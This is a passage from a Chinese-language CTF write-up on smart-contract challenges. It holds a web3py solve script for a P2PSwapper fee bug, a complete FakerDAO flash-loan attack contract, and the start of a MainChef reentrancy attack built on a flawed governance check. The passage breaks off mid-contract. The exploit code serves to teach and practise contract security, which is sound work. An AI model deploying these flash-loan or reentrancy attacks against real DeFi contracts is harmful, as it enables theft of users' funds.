    send_transaction_sync(tx, player_account, {'gas': 3000000, 'gasPrice': gasprice, 'value': 1000000000000000000})
    #
    # approve(instance, 10eth = 1*10^19 = 10000000000000000000)
    print("[+] step2 player approve(instance, 10eth = 1*10^19 = 10000000000000000000)...")
    tx = p2pweth_contract.functions.approve(guy=challenge_address, wad=10000000000000000000)
    send_transaction_sync(tx, player_account, {'gas': 3000000, 'gasPrice': gasprice})
    #
    # P2PSwapper.createDeal(p2pweth, 1, p2pweth, 1) (value:3133338)
    print("[+] step3 createDeal(p2pweth, 1, p2pweth, 1) with player (value:3133338)...")
    tx = challenge_contract.functions.createDeal(bidToken=p2pweth_address, bidPrice=1, askToken=p2pweth_address, askAmount=1)
    send_transaction_sync(tx, player_account, {'gas': 3000000, 'gasPrice': gasprice, 'value': 3133338})
    #
    # P2PSwapper.withdrawFees(player2)
    print("[+] step4 withdrawFees(player2) from player...")
    tx = challenge_contract.functions.withdrawFees(user=player2_address)
    send_transaction_sync(tx, player_account, {'gas': 3000000, 'gasPrice': gasprice})
    #
    # P2PSwapper.withdrawFees(player3)
    print("[+] step5 withdrawFees(player3) from player...")
    tx = challenge_contract.functions.withdrawFees(user=player3_address)
    send_transaction_sync(tx, player_account, {'gas': 3000000, 'gasPrice': gasprice})
    #
    # p2pweth.transfer(instance) = 1253330
    print("[+] step6 p2pweth.transfer(instance) = 1253330...")
    tx = p2pweth_contract.functions.transfer(dst=challenge_address, wad=1253330)
    send_transaction_sync(tx, player_account, {'gas': 3000000, 'gasPrice': gasprice})
    #
    # P2PSwapper.withdrawFees(player4)
    print("[+] step7 withdrawFees(player2) from player...")
    tx = challenge_contract.functions.withdrawFees(user=player4_address)
    send_transaction_sync(tx, player_account, {'gas': 3000000, 'gasPrice': gasprice})
    #
    print('[+] Solved {0} ...'.format(p2pweth_contract.functions.balanceOf(challenge_address).call() == 0))
图2-5 web3py自动化攻击结果
### 真实场景
## FakerDAO
### 题目描述
本关是一个基于Uniswap实现的DAO合约，使用YIN&YANG实现配对合约。初始时player拥有5000YIN&5000YANG，目标从FakerDAO合约中借取1LAMBO的流动性代币。难度七颗星。
### 合约代码分析
很明显，利用Uniswap的闪电贷属性[2]，完成借贷并在闪电贷过程中调用FakerDAO合约的borrow获取流动性token，然后归还闪电贷即可。闪电贷[2]需要实现IUniswapV2Callee接口的uniswapV2Call方法。
### 攻击
首先从攻击合约中获取配对合约token0&token1，把player拥有的初始化token，转给攻击合约，攻击合约实现uniswapV2Call接口，利用闪电贷(Flash
Loan)完成借贷，并调用FakerDAO.borrow方法获取流动性token，最后归还闪电贷。
    pragma solidity ^0.6.0;
    import "https://github.com/Uniswap/v2-core/blob/master/contracts/interfaces/IUniswapV2Callee.sol";
    import "./UniswapV2Library.sol";
    import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/solc-0.6/contracts/token/ERC20/IERC20.sol";
    contract FakerDAOAttack is IUniswapV2Callee{
        address public instance;
        function attack(address _instance, address _pair, uint256 amount0Out, uint256 amount1Out) public {
            instance = _instance;
            // (uint256 _reserve0, uint256 _reserve1,) = Pair(_pair).getReserves();
            address token0 = Pair(_pair).token0();
            address token1 = Pair(_pair).token1();
            address _router = $.UniswapV2_ROUTER02;
            IERC20(token0).approve(_router, uint256(-1));
            IERC20(token1).approve(_router, uint256(-1));
            IERC20(_pair).approve(_instance, uint256(-1));
            // add liquidity
             (uint256 amountA, uint256 amountB, uint256 _shares) = IUniswapV2Router(_router).addLiquidity(
              token0,
              token1,
              1500 * 10 ** 18,
              1500 * 10 ** 18,
              1, 1, address(this), uint256(-1));
              Pair(_pair).swap(amount0Out, amount1Out, address(this), bytes('not empty'));
        }
        function uniswapV2Call(address _sender, uint _amount0, uint _amount1, bytes calldata _data) external override {
            // address[] memory path = new address[](2);
            // uint amountToken = _amount0 == 0 ? _amount1 : _amount0;
            address token0 = Pair(msg.sender).token0();
            address token1 = Pair(msg.sender).token1();
            require(msg.sender == UniswapV2Library.pairFor($.UniswapV2_FACTORY, token0, token1),'Unauthorized');
            FakerDAO(instance).borrow(1);
            // transfer into pair(msg.sender)
                    // return flash loan 
            IERC20(token0).transfer(msg.sender, IERC20(token0).balanceOf(address(this)));
            IERC20(token1).transfer(msg.sender, IERC20(token1).balanceOf(address(this)));
        }
        function toPlayer() public {
            FakerDAO(instance).transfer(msg.sender, 1);
        }
    }
    interface FakerDAO is IERC20 {
        function borrow(uint256 _amount) external;
    }
    library $
    {
        address constant UniswapV2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f; // ropsten
        address constant UniswapV2_ROUTER02 = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D; // ropsten
    }
    interface Pair is IERC20
    {
        function token0() external view returns (address _token0);
        function token1() external view returns (address _token1);
        function price0CumulativeLast() external view returns (uint256 _price0CumulativeLast);
        function price1CumulativeLast() external view returns (uint256 _price1CumulativeLast);
        function getReserves() external view returns (uint112 _reserve0, uint112 _reserve1, uint32 _blockTimestampLast);
        function mint(address _to) external returns (uint256 _liquidity);
        function sync() external;
        function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    }
    interface IUniswapV2Router {
        function WETH() external pure returns (address _token);
        function addLiquidity(address _tokenA, address _tokenB, uint256 _amountADesired, uint256 _amountBDesired, uint256 _amountAMin, uint256 _amountBMin, address _to, uint256 _deadline) external returns (uint256 _amountA, uint256 _amountB, uint256 _liquidity);
        function removeLiquidity(address _tokenA, address _tokenB, uint256 _liquidity, uint256 _amountAMin, uint256 _amountBMin, address _to, uint256 _deadline) external returns (uint256 _amountA, uint256 _amountB);
        function swapExactTokensForTokens(uint256 _amountIn, uint256 _amountOutMin, address[] calldata _path, address _to, uint256 _deadline) external returns (uint256[] memory _amounts);
        function swapETHForExactTokens(uint256 _amountOut, address[] calldata _path, address _to, uint256 _deadline) external payable returns (uint256[] memory _amounts);
        function getAmountOut(uint256 _amountIn, uint256 _reserveIn, uint256 _reserveOut) external pure returns (uint256 _amountOut);
    }
    /**
     * steps:
     * 1) get token0 and token1 on contract.pair
     * 2) deploy FakerDAOAttack
     * 3) token0.transfer(FakerDAOAttack, 5000000000000000000000) from player
     * 4) token1.transfer(FakerDAOAttack, 5000000000000000000000) from player
     * 5) FakerDAOAttack.attack(instance, pair, 1, 999999999999999999999999)
     * 6) FakerDAOAttack.toPlayer 
    */
图3-1 完成攻击后提交检验结果
### 真实场景
## Main Khinkal Chef
### 题目描述
本关MainChef合约实现了流动性池管理的工具，可以通过add添加池子Pool信息，随着区块时间的变化，会针对Pool池子进行奖励(通过updatePool完成)。奖励通过代币KhinkalToken进行发放，每当池子更新，MainChef合约都会mint对应的奖励代币KhinkalToken，目标是盗取MainChef合约中所有的KHINKAL
token。难度五颗星。
### 合约代码分析
图4-1 设置管理员检查存在漏洞
setGovernance用以修改管理员，检查逻辑存在严重错误，可以修改管理员，从而实现向合约中添加新的token即形成新的Pool。正确的检查逻辑应该如下(多了一个下划线，导致和参数一致):
    require(msg.sender == owner() || msg.sender == governance, "Access denied");
图4-2 管理员添加新token
有了管理员权限之后，可以添加任意的token(evil token)。
图4-3 token可控
在任意添加token之后，token的transferfrom为攻击者可控的恶意函数。
图4-4 token可控&重入攻击
由于token可控，user.amount在token.transfer之后重置，致使可以利用重入攻击多次withdraw，从而实现抽干合约中的代币。
 图4-5 控制是否更新奖励
由于token可控，token的balanceOf函数可控，利用lpSupply可以控制是否奖励，这在后续攻击中需要用到，用来计算此时MainChef中的奖励代币KhinkalToken数量。
### 攻击
图4-6 代币奖励与区块高度
由于奖励代币KhinkalToken和区块高度息息相关，在真实场景中交易频繁，为了很好的实现精准控制，需要针对重入攻击(token.tranfser)进行精确布局，以保证能自适应区块高度的变化。
图4-7 重入攻击中精准计算进行控制
完整的攻击代码分为攻击合约&攻击脚本web3py，攻击脚本进行相关的计算并调用攻击合约完成攻击。 攻击合约如下:
    // SPDX-License-Identifier: MIT
    pragma solidity 0.6.12;
    import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/solc-0.6/contracts/token/ERC20/IERC20.sol";
    import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/solc-0.6/contracts/access/Ownable.sol";
    import "./KhinkalToken.sol";
    interface IMainChef {
        function setGovernance(address _governance) external;
        function withdraw(uint256 _pid) external;
        function deposit(uint256 _pid,uint256 _amount) external;
        function addToken(IERC20 _lpToken) external; 
        function updatePool(uint256 _pid) external;
    }
    contract MainChefAttack is Ownable {
        IMainChef target;
        uint pwnedtransferFlag;
        uint pwnedtransferFromFlag;
        uint balanceOfFlag;
        uint256 pid;
        KhinkalToken khinkal;
        uint256 accKhinkalPerShare;
        constructor(address _target, address _token) public {
            target = IMainChef(_target);
            khinkal = KhinkalToken(_token);
            balanceOfFlag = 1;
            pid = 1;
            pwnedtransferFlag = 0;
        }
        function setAccKhinkalPerShare(uint256 _accKhinkalPerShare) public onlyOwner {
            accKhinkalPerShare = _accKhinkalPerShare;
        }
        // function balanceOf(address account) public view virtual returns (uint256) {
        function balanceOf(address account) public virtual returns (uint256) {
            if (balanceOfFlag == 1) {
                return 0;
            } else {